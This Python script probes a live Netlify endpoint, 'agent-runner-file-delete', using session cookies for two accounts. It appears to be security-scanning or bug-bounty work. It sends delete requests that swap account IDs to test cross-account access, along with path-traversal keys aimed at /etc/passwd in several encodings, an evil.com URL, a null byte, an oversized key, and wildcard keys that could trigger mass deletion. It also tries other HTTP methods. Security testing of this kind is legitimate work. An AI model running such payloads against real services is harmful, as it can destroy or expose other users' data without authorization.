# -*- coding: utf-8 -*-
"""agent-runner-file-delete 变异:身份/accountId/fileKey 矩阵"""
import http.client, ssl, gzip, brotli, json, sys, time, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B

ACC_A = '6a979dd2ae93f47d55b62897'
ACC_B = '6a97b6454fef0db964f75db6'
ctx = ssl.create_default_context()

def req(path, cookie=COOKIE_A, method='POST', body=None, timeout=20):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    t0 = time.time()
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    b = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:250]
    conn.close()
    return st, dt, b

def show(label, acc, key, ck=COOKIE_A):
    p = '/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=%s' % (acc, urllib.parse.quote(key, safe=''))
    st, dt, b = req(p, ck)
    print('%-44s %s %5.1fs | %s' % (label, st, dt, b))

print('== 1. delete 基础(假 key)==')
show('A+ACC_A+rand uuid', ACC_A, '11111111-2222-3333-4444-555555555555')
show('A+ACC_A+rand str', ACC_A, 'nonexistent-key-abc')
show('A+ACC_A+txt name', ACC_A, 'probe-a.txt')
show('B+ACC_B+rand uuid', ACC_B, '11111111-2222-3333-4444-555555555555', COOKIE_B)
show('ANON', ACC_A, 'x', None)

print()
print('== 2. 参数缺失 ==')
show('no fileKey', ACC_A, '')
show('no acc', '', 'x')
show('both empty', '', '')

print()
print('== 3. fileKey 结构变异(路径/URL 形态)==')
for lbl, k in [
    ('slash prefix',   '/etc/passwd'),
    ('dotdot deep',    '../../../../etc/passwd'),
    ('dotdot enc',     '%2e%2e%2f%2e%2e%2fetc%2fpasswd'),
    ('double enc',     '..%252f..%252fetc'),
    ('http url',       'http://evil.com/x'),
    ('s3 url',         's3://bucket/key'),
    ('uuid w slash',   'acc/11111111-2222-3333-4444-555555555555'),
    ('backslash',      '..\\..\\etc\\passwd'),
    ('nul byte',       'a\x00b.txt'),
    ('very long',      'k' * 5000),
    ('wildcard',       '*'),
    ('glob txt',       '*.txt'),
]:
    show('key:' + lbl, ACC_A, k)

print()
print('== 4. method 变异 ==')
st, dt, b = req('/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=x' % ACC_A, COOKIE_A, method='GET')
print('GET  %s %5.1fs | %s' % (st, dt, b))
st, dt, b = req('/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=x' % ACC_A, COOKIE_A, method='DELETE')
print('DELETE %s %5.1fs | %s' % (st, dt, b))
st, dt, b = req('/.netlify/functions/agent-runner-file-delete?accountId=%s&fileKey=x' % ACC_A, COOKIE_A, body=b'{}')
print('POST+body %s %5.1fs | %s' % (st, dt, b))
print('done')
